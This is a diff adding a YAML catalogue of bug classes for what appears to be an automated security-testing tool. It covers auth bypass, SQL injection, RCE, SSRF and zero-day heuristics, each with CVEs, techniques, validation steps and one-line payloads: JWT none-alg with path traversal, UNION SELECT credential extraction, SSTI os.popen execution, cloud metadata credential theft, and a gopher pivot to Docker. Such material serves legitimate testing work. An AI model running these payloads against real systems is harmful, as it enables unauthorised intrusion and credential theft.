@@ -1,0 +1,72 @@
+bug_classes:
+  auth_bypass:
+    description: >-
+      Access control failures that allow unauthenticated users to reach restricted
+      actions. Focus on logic flaws (JWT none alg, path confusion, mis-scoped cookies).
+    cves:
+      - CVE-2023-4966
+      - CVE-2020-26245
+    ttps:
+      - OAuth redirect_uri manipulation to leak auth codes
+      - JWT kid header path traversal to arbitrary file read
+    payloads:
+      - '{"alg":"none","kid":"../../../../etc/passwd"}'
+      - 'GET /admin/..;/ HTTP/1.1'
+    validation:
+      - Compare restricted endpoints vs baseline via response_validation_tool
+      - Replay with gibberish endpoint + negative control session token
+  sqli:
+    description: 'SQL injection exploitation paths for extracting credentials quickly.'
+    cves:
+      - CVE-2023-34362
+      - CVE-2022-22965
+    ttps:
+      - Boolean-based blind extraction via binary search
+      - Time-based detection with SLEEP(5) differentials
+    payloads:
+      - "' UNION SELECT email,password FROM users--"
+      - "1 OR SLEEP(5)--"
+    validation:
+      - sqlmap --risk=3 --level=5
+      - confirm_finding_tool with database evidence
+  rce:
+    description: 'Remote code execution primitives (template injection, unsafe deserialization, command injection).'
+    cves:
+      - CVE-2023-4863
+      - CVE-2022-47966
+    ttps:
+      - SSTI payloads like {{7*7}} → escalate to {{cycler.__init__.__globals__}}
+      - Chained file upload → log poisoning → log deserialization
+    payloads:
+      - "{{cycler.__init__.__globals__['os'].popen('id').read()}}"
+      - ";curl http://127.0.0.1:8000/marker"
+    validation:
+      - Compare output vs expected marker via response_validation_tool
+      - Negative control command without payload must differ
+  ssrf:
+    description: 'Server-side request forgery detection for metadata pivots.'
+    cves:
+      - CVE-2019-6977
+      - CVE-2021-21985
+    ttps:
+      - Access http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      - abuse gopher:// wrappers to reach internal admin endpoints
+    payloads:
+      - 'http://169.254.169.254/latest/meta-data/'
+      - 'gopher://127.0.0.1:2375/_GET /v1.24/containers/json HTTP/1.1'
+    validation:
+      - Differential request with blocked destination should fail
+      - confirm_finding_tool must include credential artifact
+  zero_day:
+    description: >-
+      Patterns indicating novel attack surface (unversioned admin panels, debug endpoints,
+      build artifacts, orphan APIs). Use heuristics module to prioritize.
+    ttps:
+      - Detect /admin with no JS/CSS fingerprint
+      - Identify "X-Debug" headers or stack traces referencing unknown builds
+    payloads:
+      - 'GET /__debug__/vars'
+      - 'GET /internal/feature-flags'
+    validation:
+      - Combine zero_day_pattern_scan tool with adaptive_chain_plan
+      - Force baseline comparison + negative controls
